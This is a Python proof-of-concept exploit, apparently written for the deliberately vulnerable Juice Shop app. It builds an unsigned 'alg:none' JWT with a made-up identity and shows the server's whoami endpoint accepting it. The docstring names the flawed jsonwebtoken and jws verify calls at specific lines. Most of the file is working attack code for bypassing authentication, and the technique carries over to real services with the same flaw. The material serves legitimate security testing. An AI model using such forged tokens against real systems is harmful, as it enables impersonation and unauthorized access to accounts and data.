"""Forged-JWT authentication bypass (user-controlled-bypass / CWE-807).

Two token verifiers trust the algorithm named in the attacker-controlled JWT
header, so a forged token is accepted as authentication:
  - lib/insecurity.ts:188 updateAuthenticatedUsers -> jwt.verify(token, publicKey)
    (jsonwebtoken 0.4.0, no `algorithms` allowlist) puts the decoded payload in
    authenticatedUsers.
  - lib/insecurity.ts:55 security.verify -> jws.verify(token, publicKey)
    (jws 0.2.6, 2-arg form) returns true for the same token.

Proof: an `alg:none` token (no key, no signature) carrying an arbitrary identity
is accepted end-to-end. GET /rest/user/whoami echoes the forged email although no
login happened and the identity does not exist in the database. A garbage token is
rejected (empty user), so it is the forged header, not the request shape, that works.
This is the jwtUnsignedChallenge; the HS256-signed-with-the-public-key variant
(jwtForgedChallenge) is accepted the same way.
"""

import base64
import json
import urllib.request

FORGED_EMAIL = "forged-unsigned@evil.test"


def _b64url(obj: dict) -> str:
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _whoami_email(base: str, token: str) -> str | None:
    req = urllib.request.Request(f"{base}/rest/user/whoami",
                                 headers={"Cookie": f"token={token}"})
    with urllib.request.urlopen(req) as res:
        return json.load(res).get("user", {}).get("email")


def exploit(base: str) -> tuple[bool, str]:
    # alg:none token, empty signature, arbitrary identity.
    header = _b64url({"alg": "none", "typ": "JWT"})
    payload = _b64url({"status": "success",
                       "data": {"id": 31337, "email": FORGED_EMAIL}})
    forged = f"{header}.{payload}."

    baseline = _whoami_email(base, "not-a-jwt")
    leaked = _whoami_email(base, forged)

    accepted = (leaked == FORGED_EMAIL) and (baseline != FORGED_EMAIL)
    return accepted, (f"forged alg:none token accepted: whoami email={leaked!r} "
                      f"(garbage-token baseline={baseline!r})")
